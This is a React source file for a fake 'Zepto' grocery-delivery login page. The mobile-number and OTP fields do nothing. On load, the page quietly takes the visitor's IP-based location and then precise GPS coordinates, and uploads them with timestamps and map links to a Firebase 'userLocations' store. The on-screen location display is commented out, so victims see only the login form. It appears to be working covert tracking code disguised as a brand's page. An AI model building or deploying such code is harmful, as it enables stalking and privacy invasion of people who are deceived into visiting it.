import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, push } from "firebase/database";

function App() {
  const [location, setLocation] = useState(null);
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);

  useEffect(() => {
    getIPLocation(); // Step 1: Get IP-based location first
  }, []);

  // 📌 Step 1: Get Location Using IP First
  const getIPLocation = async () => {
    try {
      console.log("📌 Fetching IP-based location...");
      const response = await fetch(`https://ip-api.com/json?timestamp=${Date.now()}`);
      if (!response.ok) throw new Error("Failed to fetch IP location");

      const data = await response.json();
      console.log("✅ IP Location Data:", data);

      const ipLocationData = {
        latitude: data.lat,
        longitude: data.lon,
        method: "IP-based",
        city: data.city,
        country: data.country,
        timestamp: new Date().toISOString(),
        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`,
      };

      setLocation(ipLocationData);
      await saveLocation(ipLocationData);

      console.log("📌 IP location saved. Now requesting GPS location...");
      requestGPSLocation();
    } catch (err) {
      console.error("❌ IP Geolocation failed:", err);
      requestGPSLocation();
    }
  };

  // 📌 Step 2: Request GPS Permission
  const requestGPSLocation = () => {
    console.log("📌 Checking GPS location permission...");
    if ("permissions" in navigator) {
      navigator.permissions
        .query({ name: "geolocation" })
        .then((permission) => {
          if (permission.state === "granted" || permission.state === "prompt") {
            console.log("✅ GPS permission granted. Fetching GPS...");
            getGPSLocation();
          } else {
            console.warn("❌ GPS Permission Denied.");
            setGpsDenied(true);
          }
        })
        .catch(() => {
          console.warn("⚠️ Permission API failed, trying GPS...");
          getGPSLocation();
        });
    } else {
      console.warn("⚠️ Permission API not supported, trying GPS...");
      getGPSLocation();
    }
  };

  // 📌 Step 3: Get Precise GPS Location
  const getGPSLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;

          const gpsLocationData = {
            latitude,
            longitude,
            method: "GPS",
            timestamp: new Date().toISOString(),
            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
          };

          setLocation(gpsLocationData);
          saveLocation(gpsLocationData);
          setLoading(false);
        },
        (error) => {
          console.warn("❌ GPS failed:", error);
          setGpsDenied(true);
          setLoading(false);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      console.error("❌ Geolocation not supported");
    }
  };

  // 📌 Save Location to Firebase
  const saveLocation = async (locationData) => {
    const locationRef = ref(database, "userLocations");
    await push(locationRef, locationData);
    console.log("✅ Location saved to Firebase:", locationData);
  };

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        height: "100vh",
        backgroundColor: "#f0f2f5",
        fontFamily: "Arial, sans-serif",
      }}
    >
      <div
        style={{
          textAlign: "center",
          width: "90%",
          maxWidth: "400px",
          backgroundColor: "white",
          padding: "20px",
          borderRadius: "8px",
          boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
        }}
      >
        <h1 style={{ color: "#2A2E43", fontSize: "32px", fontWeight: "bold" }}>
          Zepto
        </h1>
        <p style={{ color: "#606770", fontSize: "16px" }}>
          Fast & seamless grocery delivery
        </p>

        <input
          type="text"
          placeholder="Enter Mobile Number"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <input
          type="password"
          placeholder="Enter OTP"
          style={{
            width: "100%",
            padding: "12px",
            margin: "10px 0",
            borderRadius: "6px",
            border: "1px solid #ddd",
            fontSize: "16px",
          }}
        />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#FF4C3B",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
            marginTop: "10px",
          }}
        >
          Log In
        </button>

        <p
          style={{
            color: "#FF4C3B",
            fontSize: "14px",
            marginTop: "10px",
            cursor: "pointer",
          }}
        >
          Resend OTP
        </p>
        <hr style={{ margin: "20px 0", border: "0.5px solid #ddd" }} />
        <button
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: "#2A2E43",
            color: "white",
            fontSize: "16px",
            fontWeight: "bold",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
          }}
        >
          Create New Account
        </button>

        {/* Location Information */}
        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
          {loading ? (
            <p>Fetching location...</p>
          ) : location ? (
            <div>
              <p>Latitude: {location.latitude}</p>
              <p>Longitude: {location.longitude}</p>
              {location.city && <p>City: {location.city}</p>}
              {location.country && <p>Country: {location.country}</p>}
              <p>Method: {location.method}</p>
              <a
                href={location.mapLink}
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  color: "#FF4C3B",
                  textDecoration: "none",
                  fontWeight: "bold",
                }}
              >
                View on Google Maps
              </a>
            </div>
          ) : gpsDenied ? (
            <p style={{ color: "red", fontWeight: "bold" }}>
              GPS is blocked. Please enable location services or refresh the page.
            </p>
          ) : (
            <p>Could not retrieve location</p>
          )}
        </div> */}
      </div>
    </div>
  );
}

export default App;
